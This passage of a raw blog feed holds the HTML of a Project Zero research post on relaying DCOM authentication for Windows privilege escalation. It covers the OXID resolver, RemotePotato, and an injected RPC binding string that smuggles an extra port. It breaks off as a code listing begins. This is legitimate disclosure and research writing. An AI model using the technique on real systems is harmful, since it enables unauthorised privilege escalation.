vulnerability.&lt;/span&gt;&lt;/p&gt;&lt;hr class=\"c44\"&gt;&lt;div&gt;\n &lt;p class=\"c3 c33\"&gt;&lt;a href=\"#ftnt_ref1\" id=\"ftnt1\" name=\"ftnt1\"&gt;[1]&lt;/a&gt;&lt;span class=\"c8 c36 c47\"&gt;&amp;nbsp;In this minimal example, a workaround if source was available would be to use a combination of sancov&amp;#39;s data-flow instrumentation options, but that also fails on more complex variants.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/7868790017880077590/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2021/12/this-shouldnt-have-happened.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/7868790017880077590"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/7868790017880077590"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2021/12/this-shouldnt-have-happened.html","@title":"This shouldn't have happened: A vulnerability postmortem"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-5634534606665421566","published":"2021-10-20T09:38:00.001-07:00","updated":"2022-08-23T12:22:51.164-07:00","title":{"@type":"text","#text":"Windows Exploitation Tricks: Relaying DCOM Authentication"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;.lst-kix_21eii7u3d36d-6&gt;li:before{content:\"\" counter(lst-ctn-kix_21eii7u3d36d-6,decimal) \". \"}.lst-kix_4h5ag0d3tyrp-4&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-4}ol.lst-kix_21eii7u3d36d-8{list-style-type:none}ol.lst-kix_21eii7u3d36d-7{list-style-type:none}ol.lst-kix_21eii7u3d36d-0.start{counter-reset:lst-ctn-kix_21eii7u3d36d-0 0}ol.lst-kix_21eii7u3d36d-6{list-style-type:none}ol.lst-kix_21eii7u3d36d-5{list-style-type:none}.lst-kix_21eii7u3d36d-3&gt;li:before{content:\"(\" counter(lst-ctn-kix_21eii7u3d36d-3,decimal) \") \"}ol.lst-kix_21eii7u3d36d-4{list-style-type:none}.lst-kix_21eii7u3d36d-7&gt;li:before{content:\"\" counter(lst-ctn-kix_21eii7u3d36d-7,lower-latin) \". \"}ol.lst-kix_21eii7u3d36d-3{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-6.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-6 0}.lst-kix_21eii7u3d36d-2&gt;li:before{content:\"\" counter(lst-ctn-kix_21eii7u3d36d-2,lower-roman) \") \"}ol.lst-kix_21eii7u3d36d-2{list-style-type:none}ol.lst-kix_21eii7u3d36d-1{list-style-type:none}ol.lst-kix_21eii7u3d36d-7.start{counter-reset:lst-ctn-kix_21eii7u3d36d-7 0}ol.lst-kix_21eii7u3d36d-0{list-style-type:none}.lst-kix_21eii7u3d36d-0&gt;li:before{content:\"\" counter(lst-ctn-kix_21eii7u3d36d-0,decimal) \") \"}ol.lst-kix_21eii7u3d36d-3.start{counter-reset:lst-ctn-kix_21eii7u3d36d-3 0}.lst-kix_21eii7u3d36d-8&gt;li:before{content:\"\" counter(lst-ctn-kix_21eii7u3d36d-8,lower-roman) \". \"}.lst-kix_21eii7u3d36d-1&gt;li:before{content:\"\" counter(lst-ctn-kix_21eii7u3d36d-1,lower-latin) \") \"}.lst-kix_21eii7u3d36d-3&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-3}.lst-kix_4h5ag0d3tyrp-5&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-5}ol.lst-kix_21eii7u3d36d-6.start{counter-reset:lst-ctn-kix_21eii7u3d36d-6 0}ol.lst-kix_4h5ag0d3tyrp-3.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-3 0}ol.lst-kix_4h5ag0d3tyrp-7.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-7 0}.lst-kix_21eii7u3d36d-2&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-2}.lst-kix_21eii7u3d36d-5&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-5}.lst-kix_21eii7u3d36d-8&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-8}ol.lst-kix_4h5ag0d3tyrp-0.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-0 0}ol.lst-kix_21eii7u3d36d-8.start{counter-reset:lst-ctn-kix_21eii7u3d36d-8 0}ol.lst-kix_4h5ag0d3tyrp-4.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-4 0}ol.lst-kix_21eii7u3d36d-2.start{counter-reset:lst-ctn-kix_21eii7u3d36d-2 0}.lst-kix_4h5ag0d3tyrp-0&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-0}.lst-kix_21eii7u3d36d-4&gt;li:before{content:\"(\" counter(lst-ctn-kix_21eii7u3d36d-4,lower-latin) \") \"}.lst-kix_4h5ag0d3tyrp-6&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-6}.lst-kix_21eii7u3d36d-5&gt;li:before{content:\"(\" counter(lst-ctn-kix_21eii7u3d36d-5,lower-roman) \") \"}.lst-kix_4h5ag0d3tyrp-3&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-3}ol.lst-kix_4h5ag0d3tyrp-6{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-7{list-style-type:none}ol.lst-kix_21eii7u3d36d-5.start{counter-reset:lst-ctn-kix_21eii7u3d36d-5 0}ol.lst-kix_4h5ag0d3tyrp-4{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-1.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-1 0}ol.lst-kix_4h5ag0d3tyrp-5{list-style-type:none}.lst-kix_4h5ag0d3tyrp-7&gt;li:before{content:\"\" counter(lst-ctn-kix_4h5ag0d3tyrp-7,lower-latin) \". \"}.lst-kix_21eii7u3d36d-6&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-6}ol.lst-kix_4h5ag0d3tyrp-8.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-8 0}.lst-kix_4h5ag0d3tyrp-1&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-1}ol.lst-kix_4h5ag0d3tyrp-8{list-style-type:none}.lst-kix_4h5ag0d3tyrp-4&gt;li:before{content:\"\" counter(lst-ctn-kix_4h5ag0d3tyrp-4,lower-latin) \". \"}.lst-kix_4h5ag0d3tyrp-8&gt;li:before{content:\"\" counter(lst-ctn-kix_4h5ag0d3tyrp-8,lower-roman) \". \"}.lst-kix_21eii7u3d36d-0&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-0}.lst-kix_4h5ag0d3tyrp-3&gt;li:before{content:\"\" counter(lst-ctn-kix_4h5ag0d3tyrp-3,decimal) \". \"}ol.lst-kix_4h5ag0d3tyrp-2{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-3{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-0{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-1{list-style-type:none}.lst-kix_4h5ag0d3tyrp-2&gt;li:before{content:\"\" counter(lst-ctn-kix_4h5ag0d3tyrp-2,lower-roman) \". \"}.lst-kix_4h5ag0d3tyrp-7&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-7}ol.lst-kix_21eii7u3d36d-1.start{counter-reset:lst-ctn-kix_21eii7u3d36d-1 0}.lst-kix_4h5ag0d3tyrp-5&gt;li:before{content:\"\" counter(lst-ctn-kix_4h5ag0d3tyrp-5,lower-roman) \". \"}.lst-kix_4h5ag0d3tyrp-8&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-8}.lst-kix_4h5ag0d3tyrp-6&gt;li:before{content:\"\" counter(lst-ctn-kix_4h5ag0d3tyrp-6,decimal) \". \"}ol.lst-kix_21eii7u3d36d-4.start{counter-reset:lst-ctn-kix_21eii7u3d36d-4 0}.lst-kix_4h5ag0d3tyrp-2&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-2}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_4h5ag0d3tyrp-5.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-5 0}.lst-kix_21eii7u3d36d-4&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-4}.lst-kix_21eii7u3d36d-7&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-7}.lst-kix_4h5ag0d3tyrp-1&gt;li:before{content:\"\" counter(lst-ctn-kix_4h5ag0d3tyrp-1,lower-latin) \". \"}.lst-kix_21eii7u3d36d-1&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-1}.lst-kix_4h5ag0d3tyrp-0&gt;li:before{content:\"\" counter(lst-ctn-kix_4h5ag0d3tyrp-0,decimal) \". \"}ol.lst-kix_4h5ag0d3tyrp-2.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-2 0}ol{margin:0;padding:0}table td,table th{padding:0}.c31{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.c23{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c6{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:\"Courier New\";font-style:normal}.c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c10{background-color:#ffffff;font-size:10pt;font-family:\"Courier New\";color:#8000ff;font-weight:400}.c3{background-color:#ffffff;font-size:10pt;font-family:\"Courier New\";color:#000080;font-weight:700}.c20{border-spacing:0;border-collapse:collapse;margin-right:auto}.c16{background-color:#ffffff;font-size:10pt;font-family:\"Courier New\";font-weight:700}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c11{background-color:#ffffff;font-size:10pt;font-family:\"Courier New\";font-weight:400}.c25{color:#000000;font-weight:400;font-size:16pt;font-family:\"Arial\"}.c22{color:#000000;font-weight:400;font-size:11pt;font-family:\"Courier New\"}.c2{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c8{font-size:10pt;font-family:\"Courier New\";color:#a82d00;font-weight:400}.c7{font-size:10pt;font-family:\"Courier New\";color:#696969;font-weight:400}.c12{font-size:10pt;font-family:\"Courier New\";font-weight:400}.c17{text-decoration:none;vertical-align:baseline;font-style:normal}.c29{padding:0;margin:0}.c34{margin-left:36pt;padding-left:0pt}.c35{max-width:468pt;padding:72pt 72pt 72pt 72pt}.c21{color:inherit;text-decoration:inherit}.c14{color:#8b0000}.c13{color:#0000ff}.c19{height:11pt}.c15{color:#800000}.c4{font-style:italic}.c18{color:#800080}.c24{color:#006161}.c33{background-color:#ffffff}.c32{color:#000080}.c27{color:#a31515}.c30{color:#00008b}.c26{height:0pt}.c28{color:#8a2be2}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c33 c35\"&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;Posted by James Forshaw, Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;In my &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\"&gt;previous blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;I discussed the possibility of relaying Kerberos authentication from a DCOM connection. I was originally going to provide a more in-depth explanation of how that works, but as it&amp;#39;s quite involved I thought it was worthy of its own blog post. This is primarily a technique to get relay authentication from another user on the same machine and forward that to a network service such as LDAP. You could use this to escalate privileges on a host using a technique similar to a &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-2-windows-1020162019-lpe\"&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from Shenanigans Labs&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;but removing the requirement for the WebDAV service. Let&amp;#39;s get straight to it.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c23\" id=\"h.5xga9tje7jcd\"&gt;&lt;span class=\"c25 c17\"&gt;Background&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The technique to locally relay authentication for DCOM was something I originally reported back in 2015 (&lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=325\"&gt;issue 325&lt;/a&gt;&lt;/span&gt;&lt;span&gt;). This issue was fixed as CVE-2015-2370, however the underlying authentication relay using DCOM remained. This was repurposed and expanded upon by various others for local and remote privilege escalation in the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/\"&gt;RottenPotato&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;series of exploits, the latest in that line being &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://github.com/antonioCoco/RemotePotato0\"&gt;RemotePotato&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is currently unpatched as of October 2021.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The key feature that the exploit abused is standard COM marshaling. Specifically when a COM object is marshaled so that it can be used by a different process or host, the COM runtime generates an &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31\"&gt;OBJREF structure&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, most commonly the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/51312511-36e1-4ab6-993c-523643b11a29\"&gt;OBJREF_STANDARD&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;form. This structure contains all the information necessary to establish a connection between a COM client and the original object in the COM server.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;Connecting to the original object from the OBJREF is a two part process:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c29 lst-kix_4h5ag0d3tyrp-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c5 c34 li-bullet-0\"&gt;&lt;span&gt;The client extracts the &lt;/span&gt;&lt;span class=\"c4\"&gt;Object Exporter ID (OXID)&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;from the structure and contacts the OXID resolver service specified by the RPC binding information in the OBJREF.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c5 c34 li-bullet-0\"&gt;&lt;span class=\"c9\"&gt;The client uses the OXID resolver service to find the RPC binding information of the COM server which hosts the object and establishes a connection to the RPC endpoint to access the object&amp;#39;s interfaces.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;Both of these steps require establishing an MSRPC connection to an endpoint. Commonly this is either locally over ALPC, or remotely via TCP. If a TCP connection is used then the client will also authenticate to the RPC server using NTLM or Kerberos based on the security bindings in the OBJREF.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The first key insight I had for &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=325\"&gt;issue 325&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;is that you can construct an OBJREF which will always establish a connection to the OXID resolver service over TCP, even if the service was on the local machine. To do this you specify the hostname as an IP address and an arbitrary TCP port for the client to connect to. This allows you to listen locally and when the RPC connection is made the authentication can be relayed or repurposed. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;This isn&amp;#39;t yet a privilege escalation, since you need to convince a privileged user to unmarshal the OBJREF. This was the second key insight: you could get a privileged service to unmarshal an arbitrary OBJREF easily using the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage\"&gt;CoGetInstanceFromIStorage&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;API and activating a privileged COM service. This marshals a COM object, creates the privileged COM server and then unmarshals the object in the server&amp;#39;s security context. This results in an RPC call to the fake OXID resolver authenticated using a privileged user&amp;#39;s credentials. From there the authentication could be relayed to the local system for privilege escalation.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c5\"&gt;&lt;span class=\"c4\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidf0_fh87eJd499r4V31gq2EoxkP1fptUl5KU9lwkDp87pFnA3qdmY3eGRB2HqY878TZp7JhPF7F_LpNcl0ax6g6bsSWgv9sSBUx-SFUXZGssDtAFvL_P_ROZPAZW9tdiUz_06DNaFgIUsqBit5HpztFCv67tZF8EILTkQmONHwZ9U7H5G0D5Dg079/s958/image2%20%285%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidf0_fh87eJd499r4V31gq2EoxkP1fptUl5KU9lwkDp87pFnA3qdmY3eGRB2HqY878TZp7JhPF7F_LpNcl0ax6g6bsSWgv9sSBUx-SFUXZGssDtAFvL_P_ROZPAZW9tdiUz_06DNaFgIUsqBit5HpztFCv67tZF8EILTkQmONHwZ9U7H5G0D5Dg079/s958/image2%20%285%29.png\" border=\"0\" alt=\"Diagram of an DCOM authentication relay attack from issue 325\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;Being able to redirect the OXID resolver RPC connection locally to a different TCP port was not by design and Microsoft eventually fixed this in Windows 10 1809/Server 2019. The underlying issue prior to Windows 10 1809 was the string containing the host returned as part of the OBJREF was directly concatenated into an &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/string-binding\"&gt;RPC string binding&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;. Normally the RPC string binding should have been in the form of:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.e77594769c6122f6cc07295f638fefdcc6db828e\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"c20\"&gt;&lt;tbody&gt;&lt;tr class=\"c26\"&gt;&lt;td class=\"c31\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c6\"&gt;ncacn_ip_tcp:ADDRESS[135]&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;Where &lt;/span&gt;&lt;span class=\"c4\"&gt;ncacn_ip_tcp&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the protocol sequence for RPC over TCP, &lt;/span&gt;&lt;span class=\"c4\"&gt;ADDRESS &lt;/span&gt;&lt;span&gt;is the target address which would come from the string binding, and &lt;/span&gt;&lt;span class=\"c4\"&gt;[135]&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;is the well-known TCP port for the OXID resolver appended by RPCSS. However, as the ADDRESS value is inserted manually into the binding then the OBJREF could specify its own port, resulting in the string binding:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.97aa81be1b3e01eee48e6be87e60b7c9ec811e04\"&gt;&lt;/a&gt;&lt;a id=\"t.1\"&gt;&lt;/a&gt;&lt;table class=\"c20\"&gt;&lt;tbody&gt;&lt;tr class=\"c26\"&gt;&lt;td class=\"c31\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c6\"&gt;ncacn_ip_tcp:ADDRESS[9999][135]&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The RPC runtime would just pick the first port in the binding string to connect to, in this case 9999, and would ignore the second port 135. This behavior was fixed by calling the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringbindingcomposew\"&gt;RpcStringBindingCompose&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;API which will correctly escape the additional port number which ensures it&amp;#39;s ignored when making the RPC connection.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;This is where the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/\"&gt;RemotePotato exploit&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, developed by &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://twitter.com/splinter_code\"&gt;Antonio Cocomazzi&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://twitter.com/decoder_it\"&gt;Andrea Pierini&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, comes into the picture. While it was no longer possible to redirect the OXID resolving to a local TCP server, you could redirect the initial connection to an external server. A call is made to the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/65292e10-ef0c-43ee-bce7-788e271cc794\"&gt;IObjectExporter::ResolveOxid2&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;method which can return an arbitrary RPC binding string for a fake COM object. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;Unlike the OXID resolver binding string, the one for the COM object is allowed to contain an arbitrary TCP port. By returning a binding string for the original host on an arbitrary TCP port, the second part of the connection process can be relayed rather than the first. The relayed authentication can then be sent to a domain server, such as LDAP or SMB, as long as they don&amp;#39;t enforce signing.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c5\"&gt;&lt;span class=\"c4\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyrByRoxwgw3esO67XtK4FiB9Ee14So3I32nGdQJ_ZY1hLVjCPANB7jeGeUHiyi4GZ8LcHjr8UizWip0KoOhWF7pyPIN5Wi_zRzZGWeHI4RgUeiALaZOgesnzd5LVFq_gnU-_hOMo6s6J3Nm9xAp_zWtibxbjq5uQwUDb0lFNde1mJw3GC3OdGc-nU/s1302/image5%20%282%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyrByRoxwgw3esO67XtK4FiB9Ee14So3I32nGdQJ_ZY1hLVjCPANB7jeGeUHiyi4GZ8LcHjr8UizWip0KoOhWF7pyPIN5Wi_zRzZGWeHI4RgUeiALaZOgesnzd5LVFq_gnU-_hOMo6s6J3Nm9xAp_zWtibxbjq5uQwUDb0lFNde1mJw3GC3OdGc-nU/s1200/image5%20%282%29.png\" border=\"0\" alt=\"Diagram of an DCOM authentication relay attack from Remote Potato\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;This exploit has the clear disadvantage of requiring an external machine to act as the target of the initial OXID resolving. While investigating the Kerberos authentication relay attacks for DCOM, could I find a way to do everything on the same machine?&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c23\" id=\"h.ifb7mhiinb48\"&gt;&lt;span class=\"c17 c25\"&gt;Remote &amp;#10140; Local Potato&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c5\"&gt;&lt;span class=\"c9\"&gt;If we&amp;#39;re relaying the authentication for the second RPC connection, could we get the local OXID resolver to do the work for us and resolve to a local COM server on a randomly selected port? One of my goals is to write the least amount of code, which is why we&amp;#39;ll do everything in C# and .NET.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.78af739dc60f8ded5f3815bfc652d7621558437e\"&gt;&lt;/a&gt;&lt;a id=\"t.2\"&gt;&lt;/a&gt;&lt;table class=\"c20\"&gt;&lt;tbody&gt;&lt;tr class=\"c26\"&gt;&lt;td class=\"c31\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c13\"&gt;byte&lt;/span&gt;&lt;span 